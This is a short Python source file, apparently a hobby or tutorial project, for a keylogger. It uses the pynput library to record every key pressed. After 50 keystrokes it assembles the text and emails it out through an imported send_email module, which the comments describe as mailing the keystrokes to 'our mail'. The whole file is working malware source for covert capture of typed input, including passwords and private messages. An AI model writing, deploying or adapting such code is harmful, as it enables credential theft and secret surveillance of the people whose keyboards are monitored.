#The pynput library allows you to control and monitor/listen to your input devices such as they keyboard and mouse. 
import pynput
#Tthe pynput.keyboard allows us to control and monitor the keyboard. Key and Listener records the keys pressed and lists them. 
from pynput.keyboard import Key, Listener

import send_email

count = 0                                   #Variable that counts the number of keys pressed.
keys = []                                   #Array which stores the record of keys pressed.

def on_press(key):                          #Function that records the keys pressed.
    print(key, end= " ")                    # 
    print("pressed")                        #
    global keys, count                      #
    keys.append(str(key))                   #This adds the keys pressed to the array keys in form of strings that helps during mailing.
    count += 1                              #The count increases whenever a key is pressed.
    if count > 50:                          #Condition to check if the count exceeds 50.          
        count = 0                           #If yes then it refreshes count and makes it 0 for next cycle.
        email(keys)                         #Function email called with input keys array.

def email(keys):                            #Function that mails the keystrokes to our mail.
    message = ""                            #
    for key in keys:                        #Specific keys are to be discussed for conditions from all keys
        k = key.replace("'","")             #
        if key == "Key.space":              #Checks if the pressed key is SpaceBar.
            k = " "                         #If yes then a gap is recorded.        
        elif key.find("Key")>0:             #Condition to check if keys like Alt, Ctrl, Shift are pressed.
            k = ""                          #If true nothing is recorded.
        message += k                        #
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
